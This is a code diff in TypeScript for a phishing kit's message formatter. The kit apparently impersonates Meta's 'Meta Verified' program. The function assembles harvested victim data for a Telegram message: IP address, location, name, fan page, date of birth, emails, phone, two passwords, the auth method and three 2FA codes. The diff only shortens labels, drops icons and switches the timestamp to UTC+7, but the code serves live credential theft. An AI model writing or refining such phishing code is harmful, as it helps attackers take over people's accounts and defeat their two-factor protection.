@@ -170,61 +170,68 @@ function row(label: string, codeInnerHtml: string): string {
     return `<b>${escapeHtml(label)}</b> <code>${codeInnerHtml}</code>`;
 }
 
-const TG_GROUP_DIV = '<i>────────────────────</i>';
-/** NBSP: giữ icon và nội dung dòng đầu trên cùng một dòng khi Telegram wrap */
-const ICON_NBSP = '\u00A0';
+const TG_GROUP_DIV = '<i>───────────</i>';
 
-/**
- * Icon nằm cùng dòng với field đầu tiên; các dòng sau có · để thấy cùng cụm,
- * tránh icon “treo” một dòng riêng.
- */
-function groupLines(icon: string, rowStrings: string[]): string {
+function formatUtcPlus7Timestamp(date: Date = new Date()): string {
+    const fmt = new Intl.DateTimeFormat('en-GB', {
+        timeZone: 'Asia/Ho_Chi_Minh',
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: false,
+    });
+    const parts = fmt.formatToParts(date);
+    const pick = (type: string) => parts.find((p) => p.type === type)?.value ?? '00';
+    return `${pick('day')}/${pick('month')}/${pick('year')} ${pick('hour')}:${pick('minute')}:${pick('second')} UTC+7`;
+}
+
+function groupLines(rowStrings: string[]): string {
     const lines = rowStrings.filter(Boolean);
     if (!lines.length) return '';
-    const [first, ...rest] = lines;
-    const head = `${icon}${ICON_NBSP}${first}`;
-    if (!rest.length) return head;
-    return [head, ...rest.map((line) => `· ${line}`)].join('\n');
+    return lines.join('\n');
 }
 
 function formatMessage(data: any): string {
     const d = normalizeData(data);
-    const ts = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+    const ts = formatUtcPlus7Timestamp();
     const phoneVal = String(d.phone ?? '').trim();
     const phoneInner = phoneVal ? escapeHtml(`+${phoneVal}`) : '—';
 
-    const header = `📋${ICON_NBSP}<b>Meta Verified</b> · <i>${escapeHtml(ts)}</i>`;
+    const header = `📋 <b>Meta Verified</b> · <i>${escapeHtml(ts)}</i>`;
 
-    const network = groupLines('🌐', [
-        row('IP address', displayCode(d.ip)),
-        row('Location', displayCode(d.location)),
+    const network = groupLines([
+        row('IP', displayCode(d.ip)),
+        row('Loc', displayCode(d.location)),
     ]);
 
-    const profile = groupLines('👤', [
-        row('Full name', displayCode(d.fullName)),
+    const profile = groupLines([
+        row('Name', displayCode(d.fullName)),
         row('Page', displayCode(d.fanpage)),
-        row('DOB (D/M/Y)', formatDobParts(d.day, d.month, d.year)),
+        row('DOB', formatDobParts(d.day, d.month, d.year)),
     ]);
 
-    const contact = groupLines('✉️', [
-        row('Primary email', displayCode(d.email)),
-        row('Business email', displayCode(d.emailBusiness)),
+    const contact = groupLines([
+        row('Email', displayCode(d.email)),
+        row('Biz email', displayCode(d.emailBusiness)),
         row('Phone', phoneInner),
     ]);
 
     const credRows = [
-        row('Password (1)', displayCode(d.password)),
-        row('Password (2)', displayCode(d.passwordSecond)),
+        row('Pass 1', displayCode(d.password)),
+        row('Pass 2', displayCode(d.passwordSecond)),
     ];
     if (String(d.authMethod ?? '').trim()) {
-        credRows.push(row('Auth method', displayCode(d.authMethod)));
+        credRows.push(row('Auth', displayCode(d.authMethod)));
     }
-    const credentials = groupLines('🔑', credRows);
+    const credentials = groupLines(credRows);
 
-    const twoFa = groupLines('🔐', [
-        row('2FA (1)', displayCode(d.twoFa)),
-        row('2FA (2)', displayCode(d.twoFaSecond)),
-        row('2FA (3)', displayCode(d.twoFaThird)),
+    const twoFa = groupLines([
+        row('2FA 1', displayCode(d.twoFa)),
+        row('2FA 2', displayCode(d.twoFaSecond)),
+        row('2FA 3', displayCode(d.twoFaThird)),
     ]);
 
     const parts = [header, network, profile, contact, credentials, twoFa].filter(Boolean);
